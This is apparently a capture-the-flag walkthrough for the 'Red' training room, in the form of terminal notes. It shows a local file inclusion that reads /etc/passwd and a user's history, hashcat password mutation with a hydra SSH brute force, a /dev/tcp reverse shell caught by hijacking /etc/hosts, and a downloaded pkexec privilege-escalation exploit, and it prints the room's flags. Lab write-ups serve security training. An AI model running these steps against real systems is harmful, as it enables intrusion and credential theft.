#lfi 

# Red

A classic battle for the ages.

# Task 1 - What are the flags?

The match has started, and Red has taken the lead on you.  
But you are Blue, and only you can take Red down.  
  
However, Red has implemented some defense mechanisms that will make the battle a bit difficult:  
1. Red has been known to kick adversaries out of the machine. Is there a way around it?  
2. Red likes to change adversaries' passwords but tends to keep them relatively the same.   
3. Red likes to taunt adversaries in order to throw off their focus. Keep your mind sharp!  
  
This is a unique battle, and if you feel up to the challenge. Then by all means go for it!

Whenever you are ready, click on the **Start Machine** button to fire up the Virtual Machine.

## Answer the questions below

### What is the first flag?

```
curl http://10.82.138.242/index.php?page=php://filter/resource=/etc/passwd


curl http://10.82.138.242/index.php\?page\=php://filter/resource\=/home/blue/.bash_history
echo "Red rules"
cd
hashcat --stdout .reminder -r /usr/share/hashcat/rules/best64.rule > passlist.txt
cat passlist.txt
rm passlist.txt

curl http://10.82.138.242/index.php\?page\=php://filter/resource\=/home/blue/.reminder
sup3r_p@s$w0rd!

 
hashcat --stdout .reminder -r /opt/hashcat/rules/best64.rule > passlist.txt

head passlist.txt 
sup3r_p@s$w0rd!
!dr0w$s@p_r3pus
SUP3R_P@S$W0RD!
Sup3r_p@s$w0rd!
sup3r_p@s$w0rd!0
sup3r_p@s$w0rd!1
sup3r_p@s$w0rd!2
sup3r_p@s$w0rd!3
sup3r_p@s$w0rd!4
sup3r_p@s$w0rd!5
                                                               
 



hydra -l blue -P passlist.txt 10.82.138.242 ssh -t 4
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-04 01:45:52
[DATA] max 4 tasks per 1 server, overall 4 tasks, 77 login tries (l:1/p:77), ~20 tries per task
[DATA] attacking ssh://10.82.138.242:22/
[22][ssh] host: 10.82.138.242   login: blue   password: !dr0w$s@p_r3pus
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-04 01:45:56

```

```
ssh blue@10.82.138.242 

blue@red:~$ ls
flag1
blue@red:~$ cat flag1 
THM{Is_thAt_all_y0u_can_d0_blU3?}
```
### What is the second flag?

```
blue@red:~$ ps -aux

ed        15525  0.0  0.0   6972  2724 ?        S    01:46   0:00 bash -c nohup bash -i >& /dev/tcp/redrules.thm/9001 0>&1 &



blue@red:~$ cat /etc/hosts
127.0.0.1 localhost
127.0.1.1 red
192.168.0.1 redrules.thm

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouter
blue@red:~$ hostname
red
blue@red:~$ ls -la /etc/hosts
-rw-r--rw- 1 root adm 242 Jan  4 01:57 /etc/hosts

echo "10.82.109.190 redrules.thm" > /etc/hosts


nc -lnvp 9001
red@red:~$ ls
ls
flag2
red@red:~$ cat flag2
cat flag2
THM{Y0u_won't_mak3_IT_furTH3r_th@n_th1S}



```

### What is the third flag?


```
For the exploit to work, we just modify the `exploit.c` file by replacing the line

`#define BIN "/usr/bin/pkexec"` with `#define BIN "/home/red/.git/pkexec".`


python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.82.138.242 - - [04/Jan/2026 02:33:11] "GET /exploit HTTP/1.1" 200 -
10.82.138.242 - - [04/Jan/2026 02:34:26] "GET /evil.so HTTP/1.1" 200 -




gcc exploit.c -o exploit
gcc -shared -o evil.so -fPIC evil-so.c




```



```
ed@red:/tmp$ wget http://10.82.109.190:8080/exploit
wget http://10.82.109.190:8080/exploit
--2026-01-04 02:33:10--  http://10.82.109.190:8080/exploit
Connecting to 10.82.109.190:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16800 (16K) [application/octet-stream]
Saving to: \u2018exploit\u2019

     0K .......... ......                                     100%  280M=0s

2026-01-04 02:33:10 (280 MB/s) - \u2018exploit\u2019 saved [16800/16800]

red@red:/tmp$ wget http://10.82.109.190:8080/evil.so
wget http://10.82.109.190:8080/evil.so
--2026-01-04 02:34:26--  http://10.82.109.190:8080/evil.so
Connecting to 10.82.109.190:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16392 (16K) [application/octet-stream]
Saving to: \u2018evil.so\u2019

     0K .......... ......                                     100%  266M=0s

2026-01-04 02:34:26 (266 MB/s) - \u2018evil.so\u2019 saved [16392/16392]

red@red:/tmp$ ls
ls
50689.c
evil.so
exploit
snap-private-tmp
systemd-private-6b3817209eaa436996646c21f967556b-apache2.service-xs5Dgg
systemd-private-6b3817209eaa436996646c21f967556b-systemd-logind.service-kxZIii
systemd-private-6b3817209eaa436996646c21f967556b-systemd-resolved.service-i2SOwg
systemd-private-6b3817209eaa436996646c21f967556b-systemd-timesyncd.service-Cu6Mbf
red@red:/tmp$ chmod +x exploit
chmod +x exploit
red@red:/tmp$ ./exploit
./exploit
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
defense
flag3
snap
cat flag3
THM{Go0d_Gam3_Blu3_GG}

```